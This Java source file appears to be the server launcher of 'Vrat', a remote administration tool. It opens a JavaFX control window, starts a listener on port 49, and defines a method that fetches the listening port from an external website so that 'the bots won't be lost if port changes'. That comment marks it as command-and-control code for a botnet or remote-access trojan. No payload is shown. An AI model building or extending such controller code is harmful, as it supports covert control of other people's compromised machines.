package vrat.server;

import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.stage.Stage;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import javafx.application.Platform;

/*
 * @author vrmg
 */

public class Config extends Application{
    
	/*
     * Initialzes javafx gui
     */
    @Override
    public void start(Stage primaryStage) throws Exception{
        FXMLLoader loader = new FXMLLoader(getClass().getResource("Sample.fxml"));
		Parent root = loader.load();
		Controller cont = (Controller) loader.getController();
		primaryStage.setTitle("Vrat - Remote Administration Tool");
        primaryStage.setScene(new Scene(root, 1280, 650));
		primaryStage.setOnCloseRequest(e -> System.exit(0));
        primaryStage.show();
		(new Thread (new ServerStarter(49))).start();
    }

    /*
     * Gets the port from a website - That way the bots won't be lost if port changes 
     */
    private int getPort(){
	BufferedReader in;
        String i = "";
        try{
            URL whatIsMyPort = new URL("http://vrmg.heliohost.org/");
            in = new BufferedReader(new InputStreamReader(whatIsMyPort.openStream()));
            i = in.readLine();
        }
        catch(Exception e){        
        	e.printStackTrace();
        	System.out.println(ConnectionManager.getInstance().Time() + "Error getting port - check internet connection.");
        }
        return Integer.parseInt(i);
    }
	
	public static void main (String args[]){
        launch();
    }
}